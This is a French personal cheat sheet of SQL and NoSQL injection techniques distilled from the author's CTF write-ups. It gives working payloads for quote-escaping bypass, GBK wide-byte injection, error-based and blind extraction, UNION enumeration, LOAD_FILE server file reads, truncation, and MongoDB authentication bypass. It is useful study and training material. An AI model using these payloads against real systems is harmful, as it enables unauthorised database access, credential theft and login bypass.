---
titre: "SQLI — Tests, techniques & payloads"
tags: [Failles, SQLI]
---

# SQLI — Tests, techniques & payloads

> ⬅ [[SQLI - Index]]

> Fiche de synthèse **alimentée par mes write-ups**. Chaque technique renvoie au
> challenge où je l'ai employée. Voir aussi la théorie de base dans
> SQLI et le contournement UNION dans SQLI.
>
> ⚠️ Techniques à n'utiliser que sur des cibles explicitement autorisées (cf. `README`).

---

## 1. Contourner l'échappement des quotes

Quand l'application ajoute un `\` (addslashes) ou double le `'` en `''`, il faut
injecter **sans guillemet**.

### `CHAR()` / décimal — écrire une chaîne sans quote
```sql
-- au lieu de  username='admin'
username = CHAR(97,100,109,105,110)        -- "admin" en décimal (MySQL/MariaDB)
```
Employé dans [[SQLI LoadFile]] et [[SQL injection - Authentification - GBK]].

### Dollar-quoting PostgreSQL (`$$`)
Quand le `'` est doublé en `''` par le filtre, PostgreSQL accepte `$$chaine$$`
comme délimiteur de chaîne alternatif :
```sql
... WHERE us3rn4m3_c0l = $$admin$$ ...
```
Employé dans [[SQLI Error Based]].

### Wide Byte Injection (GBK / `%df`)
Contre un `addslashes` sur une base en encodage GBK : `%df%27` → le `%5c` ajouté
par le filtre fusionne avec `%df` en un caractère chinois valide, libérant le `'`.
```
login=admin%df' OR 1=1 #&password=x
```
Détail complet : [[SQL injection - Authentification - GBK]].

---

## 2. Error-based (extraction via message d'erreur)

Quand aucune sortie UNION n'est visible mais que les erreurs SQL fuient, forcer
une erreur de type qui **imprime la donnée** dans le message.

### PostgreSQL — CAST vers INT
```sql
, CAST((SELECT version()) AS INT)
, CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT)
, CAST((SELECT column_name FROM information_schema.columns
        WHERE table_name=$$m3mbr35t4bl3$$ LIMIT 1 OFFSET 0) AS INT)
```
Base de données courante : `current_database()`. Voir [[SQLI Error Based]].

---

## 3. Blind (booléen / substring)

Extraction caractère par caractère quand seule une réponse binaire est visible.
Voir aussi mes scripts d'automatisation : [[Blind SQLi — Scripts d'automatisation]].

```sql
-- Second order (RootMe)
admin' OR (ascii(substring(@@version,1,1))=56)#
a' substr(password,1,1) from(users) where(username)='admin'='a
```
Voir [[SQLI Second Order]]. Pour NoSQL, extraction via `$regex` (section 6).

---

## 4. UNION-based & lecture de fichiers

### Repérage colonnes / version
```sql
id=1 order by 4                       -- nombre de colonnes
id=-1 union select 1,@@version,3,4    -- MySQL/MariaDB (tester -1 pour vider la 1re ligne)
' UNION SELECT BANNER, NULL FROM v$version--   -- Oracle
' UNION SELECT 'abc','def' FROM dual--         -- Oracle (2 colonnes, table dual)
```
Voir [[SQLI LoadFile]], [[Oracle DB type and version]], [[SQL Numerique]].

### Lecture de fichier serveur — `LOAD_FILE()`
Chemin passé en hexa pour éviter les quotes :
```sql
id=-1 union select
  LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4
```
Permet de lire le code source (`index.php`) et d'y trouver une clé de
chiffrement, puis de déchiffrer un mot de passe (XOR + base64). Cf. [[SQLI LoadFile]].

---

## 5. Injections « exotiques »

### Routed injection (double injection imbriquée, hex)
L'entrée passe par **deux** requêtes successives. On encode la 2ᵉ injection en
hexa (`0x...`) pour la faire transiter dans la 1ʳᵉ :
```sql
-- 2e requête voulue : ' UNION SELECT 1,password FROM users WHERE id=3-- -
-- injectée via la 1re sous forme hexa :
' UNION SELECT 0x2720756e696f6e2073656c6563742031...
```
Détail : [[SQL Injection Routed]].

### Insertion (payload dans un `INSERT`)
Injecter une sous-requête dans un champ non filtré (ex. `email`) d'un formulaire
d'inscription, en créant **deux lignes d'un coup** :
```
email = reinnonplus'),('laversion','pass',version())--+-
```
Le premier user doit être unique à chaque essai (contrôle d'unicité). Cf. [[SQLI Insertion]].

### Truncation (troncature sur `varchar(n)`)
Si `username varchar(20)`, créer `admin` + espaces + `x` (> 20 car.) : la base
tronque et on obtient un **doublon d'`admin`** avec un mot de passe qu'on choisit.
Cf. [[SQLI Truncation]].

---

## 6. NoSQL injection

Opérateurs MongoDB dans les paramètres :
```
login=admin&pass[$ne]=rien          -- $ne : bypass d'authentification
login[$regex]=^a&pass[$ne]=rien     -- $regex : extraction blind caractère par caractère
```
Automatisable via Intruder (grep-match sur "connected"). Cf.
[[NoSQL injection - Authentification]] et le script [[Blind SQLi — Scripts d'automatisation]].

---

## 7. Contournement de WAF / filtres

### Encodage XML (HackVertor)
Encoder la requête en entités XML pour passer un filtre côté application :
```sql
-- payload d'origine
1 UNION SELECT username || '~' || password FROM users--
-- puis encodé en entités &#xNN; dans le corps XML
```
`||` = concaténation (Oracle/PostgreSQL). Cf. [[Filter bypass via XML encoding]].

---

## Aide-mémoire — quelle technique pour quel blocage ?

| Blocage rencontré | Technique | Write-up |
|---|---|---|
| `'` échappé par `\` | `CHAR()`, `%df` (GBK) | [[SQL injection - Authentification - GBK]] |
| `'` doublé en `''` (PostgreSQL) | `$$...$$` | [[SQLI Error Based]] |
| Pas de sortie, erreurs visibles | CAST error-based | [[SQLI Error Based]] |
| Pas de sortie, réponse binaire | Blind substring | [[SQLI Second Order]] |
| Besoin de lire un fichier | `LOAD_FILE(0x…)` | [[SQLI LoadFile]] |
| Entrée relayée en 2 requêtes | Routed / hex | [[SQL Injection Routed]] |
| Contrôle d'unicité au signup | Insertion 2 lignes | [[SQLI Insertion]] |
| `varchar(n)` court | Truncation | [[SQLI Truncation]] |
| MongoDB | `$ne`, `$regex` | [[NoSQL injection - Authentification]] |
| WAF sur mots-clés SQL | Encodage XML | [[Filter bypass via XML encoding]] |
